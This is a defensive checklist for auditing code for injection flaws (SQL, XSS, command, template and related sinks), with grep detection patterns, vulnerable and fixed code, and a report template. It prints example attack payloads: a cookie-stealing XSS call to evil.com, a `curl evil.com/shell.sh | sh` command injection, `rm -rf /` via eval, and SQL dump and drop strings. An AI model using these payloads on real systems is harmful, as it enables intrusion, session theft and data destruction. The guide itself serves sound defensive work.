# Check — Injection (SQL, XSS, command, template)

**What you're looking for:** any place where something a user typed gets stitched directly into a command the computer then runs — a database query, an HTML page, a shell command, or a template. When user text becomes part of an instruction instead of staying *data*, the user can rewrite the instruction. This is the oldest trick on the internet, and AI code generators reproduce it constantly because string concatenation reads cleaner than the safe version.

The four common flavors, all the same root cause:
- **SQL injection** — user input concatenated into a database query.
- **XSS (cross-site scripting)** — user input written into the page as raw HTML, so a `<script>` they typed runs in everyone else's browser.
- **Command injection** — user input passed to a shell (`os.system`, `exec`, `child_process`), so they can run any command on your server.
- **Template injection** — user input rendered *as* a template, so `{{ ... }}` they typed gets evaluated.

…and the same root cause shows up in **NoSQL** (Mongo `$where`/operator injection), **LDAP / XPath**, **HTTP-header / CRLF** (response-splitting), **GraphQL** arguments, **ORM raw escape-hatches** (`$queryRawUnsafe`, `.raw()`, `whereRaw`), and **second-order** injection (input stored *now*, concatenated into a sink *later*). Don't stop at the four.

**For AI apps, the untrusted set is bigger than "what the user typed."** Treat the **model's own output, tool-call results, and any retrieved / fetched content (RAG docs, scraped pages, webhook bodies)** as untrusted input too — when that text reaches a SQL/HTML/shell/eval sink, it's the same vulnerability, and it's the one AI generators ship most.

## The method — trace the taint, don't just grep the sink

A real injection finding is a **reachable flow of untrusted input into a dangerous sink with no barrier in between.** Grepping the sink alone is what makes scanners noisy *and* shallow — it flags safe code and misses multi-step flows. Check these three things, in order. Doing all three is what makes this audit as deep as a commercial taint engine while staying near-zero-false-positive.

**Step A — is there a SINK?** A construct that interprets its argument as query / markup / command / code / template. (Catalogs below.) Grep finds these.

**Step B — does TAINT reach it? Trace the argument backwards through *every* step, not one.** Follow:
- assignments (`x = req.body.q; … query(x)`),
- string building (`const sql = base + x; query(sql)`),
- **function boundaries** (`run(buildQuery(req.query.id))` → open `buildQuery` and keep going),
- returns, object fields, array elements, destructuring, template literals, **across files/modules**,
- closure/loop capture, and **second-order** (a value read back from a DB/file that was user-supplied earlier).

A value is **tainted** if any branch of that trace originates at an untrusted **source** and is never neutralized. Stop when you hit a source (→ tainted) or a constant / your-own-computed value (→ clean).

> **Confirm the source is *genuinely* untrusted on THIS path — don't assume taint from a name.** A wrapper/getter like `getValue()` / `getTheValue()` may return the request value in one place and a hardcoded constant in another — open it and check which. And watch for **dead-code / constant-substitution** that routes a *constant* (not the taint) into the sink: an always-true guard (`if ((7*42)-86 > 200)`) whose `else` branch holds the tainted assignment, an index shift (`list.add(param); list.remove(0); use(list.get(1))` → `get(1)` is now a constant), or a tainted variable that's computed then abandoned. If only a constant reaches the sink, it's **clean** — stay silent.

> **Untrusted sources (taint origins).** Web: `req.body|query|params|headers|cookies`, `request.GET|POST|FILES|data`, `$_GET|$_POST|$_REQUEST|$_COOKIE`, `params[…]`, route args, `ctx.request`, GraphQL args, uploaded file names/paths. AI apps: **LLM output, tool/function-call results, RAG-retrieved docs, fetched/scraped pages, webhook bodies.** Mobile: deep-link/intent extras, WebView `postMessage`, IPC. Stored: any DB/file value that was user-supplied earlier. Everything else (literals, env *you* set, values your code computed) is clean.

**Step C — is there a BARRIER on the path?** If the tainted value passes through a *correct* neutralizer before the sink, it is **safe — do not flag.** A barrier only counts when it's **on the tainted path** and **right for the sink's context** (HTML-escaping does nothing against SQL; SQL-escaping does nothing against a shell).

> **Barriers, per sink class.** SQL/NoSQL → parameter binding (`$1`/`?`/`:name` with the value in the args array), ORM expression APIs, Prisma tagged `` $queryRaw`…` `` (not `…Unsafe`). XSS → framework auto-escape (JSX `{x}`, Jinja/ERB default), `DOMPurify.sanitize` / `sanitize-html`, `textContent` over `innerHTML`. Command → **the discriminator is whether a SHELL re-parses the string.** *Barrier (safe — do NOT flag):* an args-array exec whose `args[0]` is a real program, not a shell — `execFile`, `subprocess.run([…], shell=False)`, `ProcessBuilder([prog, …])`, `Runtime.exec(String[])` — a tainted value sitting in a *later argument* is passed as literal data to that program, never re-interpreted as a command. *Still a finding:* `args[0]` **is** a shell (`sh`/`bash`/`zsh`/`cmd`) with `-c` and the input concatenated into the command string, OR `shell:true` / a single-string `exec(cmd + input)`. *Also a sink — don't miss it (FN guard):* a tainted value passed as the process **environment** — `Runtime.exec(cmd, envp)`'s `envp` array, `env=`, `putenv` — is env-var injection even with no shell. Plus allowlist `^[\w.-]+$`, or not shelling out at all. Template/eval → no eval; pass input as a *variable*, not a template; a safe expression parser. LDAP/XPath → the library's escape function. Header/CRLF → reject `\r`/`\n`.

**Verdict + confidence (write this into the finding):**
- **Confirmed** — tainted source → sink, no barrier, on a request/agent-handling path. Full severity.
- **Likely** — a sink with a barrier you couldn't fully confirm, or taint through indirection you couldn't fully resolve. Flag it, but say exactly what to check.
- **Not a finding** — clean source, or a correct barrier present. Stay silent. *This silence is the product's near-zero-FP promise — honor it.*

The discipline in one line: **depth comes from following the whole flow; quiet comes from honoring barriers.**

## How to scan — Step 1: find the candidate sinks

You're reading the repo, not running it. Grep for the dangerous shapes below to enumerate candidate **sinks**, then run Steps B–C above on each hit. A grep hit is a *candidate*, never a finding on its own.

### SQL injection — concatenated / interpolated queries

```bash
# JS / TS — template-literal or "+" stitched into a query call
grep -rEn --include='*.ts' --include='*.js' --include='*.jsx' --include='*.tsx' \
  --exclude-dir={node_modules,.next,dist,build} \
  -E '(query|execute|raw|\$queryRawUnsafe|\$executeRawUnsafe)\s*\(\s*`[^`]*\$\{' \
  . 2>/dev/null

# JS / TS — string-plus concatenation into SQL
grep -rEn --include='*.ts' --include='*.js' --exclude-dir={node_modules,.next,dist} \
  -E '(SELECT|INSERT|UPDATE|DELETE).*("\s*\+|\+\s*")' \
  . 2>/dev/null

# Python — f-strings / .format / % into a cursor
grep -rEn --include='*.py' \
  -E 'execute\s*\(\s*(f"|f'\''|.*%.*%|.*\.format\(|.*\+)' \
  . 2>/dev/null

# Go — fmt.Sprintf feeding a query
grep -rEn --include='*.go' \
  -E '(Query|QueryRow|Exec)\s*\(\s*fmt\.Sprintf' \
  . 2>/dev/null

# Ruby — interpolation inside where/find_by_sql/execute
grep -rEn --include='*.rb' \
  -E '(where|find_by_sql|execute)\s*\(?\s*".*#\{' \
  . 2>/dev/null

# PHP — variables inside the query string
grep -rEn --include='*.php' \
  -E '(mysqli_query|->query|->exec|pg_query)\s*\(.*\$' \
  . 2>/dev/null
```

The smell: a `${...}`, `+ var`, `f"..."`, `#{...}`, `%s % var`, `.format()`, or `Sprintf` **inside the query string itself**. The safe version always passes user values as a *separate argument* (the `?` / `$1` / `:name` placeholders), never glued into the string.

### XSS — raw HTML from user input

```bash
# React — dangerouslySetInnerHTML
grep -rEn --include='*.tsx' --include='*.jsx' --include='*.ts' --include='*.js' \
  --exclude-dir={node_modules,.next,dist} \
  'dangerouslySetInnerHTML' . 2>/dev/null

# Vanilla JS / framework escape hatches
grep -rEn --include='*.ts' --include='*.js' --include='*.html' \
  --exclude-dir={node_modules,.next,dist} \
  -E '\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML|document\.write' \
  . 2>/dev/null

# Vue / Svelte / Angular raw-HTML directives
grep -rEn --include='*.vue' --include='*.svelte' --include='*.html' \
  -E 'v-html|@html|\[innerHTML\]|bypassSecurityTrust' \
  . 2>/dev/null

# Mobile webviews — loading HTML built from user input
grep -rEn --include='*.swift' --include='*.kt' --include='*.java' --include='*.dart' \
  -E 'loadHTMLString|loadData\(|evaluateJavascript|loadUrl\(.*\+|InAppWebView' \
  . 2>/dev/null

# React Native — the WebView injection prop
grep -rEn --include='*.tsx' --include='*.jsx' --include='*.ts' --include='*.js' \
  'injectedJavaScript|injectJavaScript' . 2>/dev/null
```

### Command injection — user input reaching a shell

```bash
# JS / TS — exec/spawn with a shell string
grep -rEn --include='*.ts' --include='*.js' --exclude-dir={node_modules,.next,dist} \
  -E 'exec\s*\(|execSync\s*\(|spawn\s*\(.*shell\s*:\s*true|child_process' \
  . 2>/dev/null

# Python — os.system, popen, subprocess with shell=True, and eval/exec
grep -rEn --include='*.py' \
  -E 'os\.system|os\.popen|subprocess\.(call|run|Popen).*shell\s*=\s*True|\beval\(|\bexec\(' \
  . 2>/dev/null

# Go — exec.Command piped through a shell
grep -rEn --include='*.go' \
  -E 'exec\.Command\(\s*"(sh|bash|cmd)"' \
  . 2>/dev/null

# Ruby — backticks, system(), %x{}
grep -rEn --include='*.rb' \
  -E 'system\(|`[^`]*#\{|%x\{|Open3' \
  . 2>/dev/null

# PHP — the classic shell sinks
grep -rEn --include='*.php' \
  -E 'shell_exec|\bexec\(|\bsystem\(|passthru|popen|proc_open|`' \
  . 2>/dev/null

# Mobile — Runtime.exec / Process on Android, Kotlin/Java
grep -rEn --include='*.kt' --include='*.java' \
  -E 'Runtime\.getRuntime\(\)\.exec|ProcessBuilder' \
  . 2>/dev/null
```

### Template injection + eval-of-user-input

```bash
# JS / TS — eval, new Function, setTimeout with a string
grep -rEn --include='*.ts' --include='*.js' --exclude-dir={node_modules,.next,dist} \
  -E '\beval\(|new Function\(|setTimeout\(\s*["'\''`]' \
  . 2>/dev/null

# Python — rendering a string the user supplied as a template
grep -rEn --include='*.py' \
  -E 'Template\(.*\+|render_template_string\(|Environment\(.*autoescape\s*=\s*False' \
  . 2>/dev/null

# Any stack — user input used as a format string / template source
grep -rEn --exclude-dir={node_modules,.next,dist,vendor} \
  -E 'render_template_string|Handlebars\.compile\(|ejs\.render\(.*req\.|pug\.compile\(' \
  . 2>/dev/null
```

### Wider sinks — the classes scanners usually miss

```bash
# NoSQL (Mongo) — operator/$where injection: user object spread into a filter, or JS $where
grep -rEn --include='*.ts' --include='*.js' --exclude-dir={node_modules,.next,dist} \
  -E '\$where\s*:|\.find\(\s*req\.(body|query)|\.find\(\s*\{[^}]*\.\.\.req\.|mapReduce\(' . 2>/dev/null

# ORM raw escape-hatches (bypass the safe builder)
grep -rEn --exclude-dir={node_modules,.next,dist} \
  -E '\$queryRawUnsafe|\$executeRawUnsafe|\.raw\(|whereRaw\(|orderByRaw\(|sequelize\.query\(|connection\.query\(' . 2>/dev/null

# LDAP / XPath
grep -rEn --exclude-dir={node_modules,.next,dist} \
  -E 'search\(\s*.*filter.*\+|ldap.*\$\{|evaluate\(\s*".*\+|compile\(\s*".*\$\{' . 2>/dev/null

# HTTP header / CRLF response-splitting — user input into a header value or redirect
grep -rEn --exclude-dir={node_modules,.next,dist} \
  -E '(setHeader|set\(|writeHead|header\(|redirect)\s*\([^)]*req\.(body|query|params|headers)' . 2>/dev/null
```

**Then run the method on each hit.** For every candidate sink above, do Step B (trace the argument back to a source — through helpers, returns, and files, not one step) and Step C (is there a correct barrier on that path?). Source + no barrier = finding; clean source or a barrier present = stay silent. **Don't shortcut to "one step back" — that's how multi-step flows (`run(buildQuery(req.query.id))`, second-order stored injection) get missed and how sanitized code gets falsely flagged.**

## The dangerous patterns

**Pattern 1: SQL built with string concatenation (most common AI bug)**

```ts
// ❌ The AI wrote this because it reads naturally
const user = await db.query(
  `SELECT * FROM users WHERE email = '${req.body.email}'`
);
```

Someone types `' OR '1'='1` as their email and the query becomes `... WHERE email = '' OR '1'='1'` — which matches every row. Type `'; DROP TABLE users; --` and your table is gone. CRITICAL severity when the input is user-controlled.

**Pattern 2: `dangerouslySetInnerHTML` / `innerHTML` with user content**

```tsx
// ❌ Renders a user's bio, comment, or AI output as live HTML
<div dangerouslySetInnerHTML={{ __html: comment.body }} />
```

A user saves a comment containing `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`. Every other visitor who loads that page silently ships their session cookie to the attacker. HIGH severity (CRITICAL if the stolen session is an admin's). The "stored" kind — where the payload lives in your database and fires for every viewer — is the worst, because one comment hits all your users.

**Pattern 3: shell command with user input**

```python
# ❌ "Convert this file" feature
import os
os.system(f"convert {request.form['filename']} output.png")
```

Someone sets `filename` to `x.png; curl evil.com/shell.sh | sh` and now they're running commands as your server. From there: read your `.env`, dump your database, pivot to your cloud account. CRITICAL severity, always.

**Pattern 4: `eval` / template rendered from user input**

```js
// ❌ A "calculator" or "rules engine" that evals user text
const result = eval(req.query.expr);
```

`eval` runs whatever string it's given as code. `req.query.expr = "require('child_process').execSync('rm -rf /')"` is game over. Same story with `render_template_string(user_input)` in Flask/Jinja — `{{ config }}` or `{{ ''.__class__.__mro__ }}` leaks secrets and reaches code execution. CRITICAL.

## The fixes — show these, with code

**SQL → use parameters (placeholders), never concatenation.** The database keeps your input as *data* and never treats it as part of the query.

```ts
// ✅ Parameterized — the driver escapes for you
const user = await db.query(
  "SELECT * FROM users WHERE email = $1",   // Postgres: $1, MySQL: ?
  [req.body.email]
);

// ✅ Prisma — use the tagged template (safe) not $queryRawUnsafe
const user = await prisma.$queryRaw`SELECT * FROM users WHERE email = ${email}`;
```

```python
# ✅ Python DB-API — pass params as the second argument
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```

```go
// ✅ Go — placeholders, args separate
db.QueryRow("SELECT * FROM users WHERE email = $1", email)
```

```php
// ✅ PHP PDO prepared statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = :email");
$stmt->execute(['email' => $_POST['email']]);
```

**XSS → escape by default; sanitize only if HTML is genuinely required.**

```tsx
// ✅ Just render it as text — React escapes automatically
<div>{comment.body}</div>

// ✅ If you MUST allow some HTML (rich text), sanitize first
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.body) }} />
```

```python
# ✅ Jinja/Django auto-escape is ON by default — don't disable it.
#    Avoid |safe and mark_safe() on anything a user can influence.
```

**Command → don't build a shell string. Pass arguments as a list, no shell.**

```python
# ✅ subprocess with a list and NO shell — input can't break out
import subprocess
subprocess.run(["convert", filename, "output.png"], shell=False, check=True)
```

```ts
// ✅ Node — execFile/spawn with an args array, never a single shell string
import { execFile } from "node:child_process";
execFile("convert", [filename, "output.png"]);
```

Better still: if you only need a filename, don't shell out at all — use a library (image lib, etc.). And validate the input against an allowlist (`^[\w.-]+$`).

**eval / template → remove it.** There's almost always a real parser for what you wanted.

```js
// ❌ eval(req.query.expr)
// ✅ for math, use a safe expression library (e.g. expr-eval), never eval
import { Parser } from "expr-eval";
const result = Parser.evaluate(req.query.expr);   // can't reach process/require
```

```python
# ✅ never render user input AS a template; pass it as a VARIABLE
return render_template("page.html", name=user_input)   # not render_template_string(user_input)
```

## Report a finding as

**Title:** "Your search box lets anyone read (or wipe) the whole database"

(that's a SQL-injection title — adapt the headline to the flavor: XSS → "A comment can run code in your other users' browsers"; command → "An attacker can run commands on your server through the upload feature"; eval → "Your calculator runs whatever code a visitor types")

**Detail:**
> `src/app/api/search/route.ts:12` builds a database query by gluing the search box text straight into the SQL:
> ```ts
> const rows = await db.query(`SELECT * FROM products WHERE name LIKE '%${q}%'`);
> ```
> Here `q` is whatever the visitor typed. Because their text becomes part of the query instead of staying data, they can change what the query does.
>
> **What can go wrong:** Someone types `' UNION SELECT email, password_hash, 1 FROM users -- ` into your search box and your "product search" hands back every user's email and password. Type `'; DROP TABLE products; --` and your products table is gone. This is the single most-scanned-for bug on the internet — automated bots try it on every form within hours of you going live.
>
> **How to fix tonight (10 minutes):**
> 1. Pass the user's text as a *parameter*, never inside the query string:
>    ```ts
>    const rows = await db.query(
>      "SELECT * FROM products WHERE name LIKE $1",
>      [`%${q}%`]
>    );
>    ```
>    The `$1` is a placeholder; the database treats `q` purely as data and never as SQL. (MySQL uses `?` instead of `$1`.)
> 2. Grep the rest of the repo for the same shape — any query with a `` ` `` template literal, a `+ variable`, an f-string, or `.format()` inside it. AI generators repeat this pattern, so where there's one there are usually several. Fix them all in one pass.
> 3. Verify: type a single quote `'` into the search box after deploy. A fixed app returns "no results"; a vulnerable one throws a SQL error.

Repeat the report block for every distinct injection site you found, grouped by flavor.

**Lead every finding with its confidence and the traced path.** State `Confirmed` or `Likely` (from the method's verdict rule), and name the **source → sink path** you followed — e.g. `req.query.id → buildQuery() → db.query()` or `RAG doc → answer → dangerouslySetInnerHTML`. That traced path is the whole difference between this audit and a grep tool: it proves the flow is real, tells the founder exactly where to cut it, and is the thing a false-positive can't fake.

## Don't false-positive on

This is where injection checks usually cry wolf. Be strict — only flag when **user-controlled input actually reaches the sink.**

- **Parameterized queries that just look scary.** `db.query("... WHERE id = $1", [id])` or `cursor.execute(sql, (id,))` — the value is in the args array, not in the string. **Safe. Don't flag.** Prisma's `$queryRaw\`...${x}\`` tagged template is also safe (only the `Unsafe` variants concatenate).
- **ORM query builders.** `prisma.user.findMany({ where: { email } })`, `db.select().where(eq(users.email, email))` (Drizzle), Sequelize/TypeORM/SQLAlchemy expression APIs, ActiveRecord `where(email: x)` — these parameterize under the hood. Safe.
- **Constants and your own computed values in a query string.** `` `SELECT * FROM ${TABLE_NAMES[kind]}` `` where `kind` was already validated against a fixed allowlist is fine. Only the *user-controlled* path matters.
- **`dangerouslySetInnerHTML` / `v-html` fed sanitized or trusted content.** If the value goes through `DOMPurify.sanitize(...)`, `sanitize-html`, or is a hardcoded/Markdown-rendered-then-sanitized string, it's handled. Server-rendered MDX/Markdown from your own repo (docs, blog) is trusted content — note as INFO at most.
- **`eval`/`exec`/`Function` on developer-controlled input.** A build script that `eval`s a config file you wrote, or `os.system` running a fixed command with no user variable, is not an injection vuln. Flag only when the data crosses from a user into the sink.
- **Logging, not executing.** `console.log(`got ${userInput}`)` or `logger.info(f"user said {x}")` is string interpolation but nothing runs it. Not injection.
- **Test files, fixtures, mocks, seed scripts.** Paths under `__tests__/`, `*.test.*`, `*.spec.*`, `fixtures/`, `seeds/`, `migrations/` with literal seed values aren't a production attack surface. Mention only if a real secret or prod path is involved.
- **`innerHTML` set to a static string literal.** `el.innerHTML = "<span>Loading…</span>"` with no variable is just DOM building. Safe.

When in doubt, trace the value to its source. No user source, no finding. The product's credibility depends on not flagging every `db.query()` in the codebase.
